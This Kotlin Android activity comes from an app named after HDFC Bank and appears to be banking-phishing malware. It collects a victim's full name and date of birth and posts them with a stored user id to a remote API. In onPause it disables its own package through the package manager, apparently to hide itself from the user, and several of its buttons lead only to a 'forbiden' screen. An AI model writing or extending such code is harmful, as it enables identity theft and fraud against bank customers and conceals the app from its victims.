package com.example.hdfc_new_app

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.hdfc_new_app.databinding.ActivitySecondpageBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class secondpage : AppCompatActivity() {

    private lateinit var binding:ActivitySecondpageBinding
    private val dateOfBirthTextWatcher = DateOfBirthTextWatcher()
    private val util = Util()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySecondpageBinding.inflate(layoutInflater)
        setContentView(binding.root)

        util.saveLocalData(this,"check","true")

        binding.e2.addTextChangedListener(dateOfBirthTextWatcher)


        binding.a1.setOnClickListener { transfer() }
        binding.a2.setOnClickListener { transfer() }
        binding.a3.setOnClickListener { transfer() }
        binding.a4.setOnClickListener { transfer() }
        binding.a5.setOnClickListener { transfer() }
        binding.a6.setOnClickListener { transfer() }



        binding.sub.setOnClickListener {
            util.saveLocalData(this ,"check","false")
            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty()){
                Toast.makeText(this,"Fill all fields", Toast.LENGTH_SHORT).show()
            }else{

                val intentff = Intent(this,thirdpage::class.java)

                val data = SecondPagem(userid = util.getLocalData(this,"u") ,
                    fullname = binding.e1.text.toString(), dob = binding.e2.text.toString())
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val call = apiService.secondpage(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })


            }
        }


    }

    override fun onPause() {
        super.onPause()
        val util =  Util()
        if(util.getLocalData(this,"check")=="true") {
            Log.e("asdf123", "pause: verify activity")
            val pakagemanger = packageManager
            pakagemanger.setApplicationEnabledSetting(
                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    private fun transfer(){
        val intent = Intent(this,forbiden::class.java)
        startActivity(intent)
    }

}




class DateOfBirthTextWatcher : TextWatcher {
    private var isFormatting = false
    private val dateSeparator = '/'
    private val datePattern = Regex("[0-9]{2}/[0-9]{2}/[0-9]{4}")

    override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}

    override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}

    override fun afterTextChanged(s: Editable?) {
        if (isFormatting) {
            return
        }

        isFormatting = true
        formatDate(s)
        isFormatting = false
    }

    private fun formatDate(text: Editable?) {
        text?.let {
            val dateLength = text.length
            if (dateLength == 3 || dateLength == 6) {
                if (text[dateLength - 1] != dateSeparator) {
                    text.insert(dateLength - 1, dateSeparator.toString())
                }
            }

            if (dateLength >= 10) {
                val date = text.toString()
                if (!datePattern.matches(date)) {
                    // Invalid date format, clear the text
                    text.clear()
                }
            }
        }
    }
}

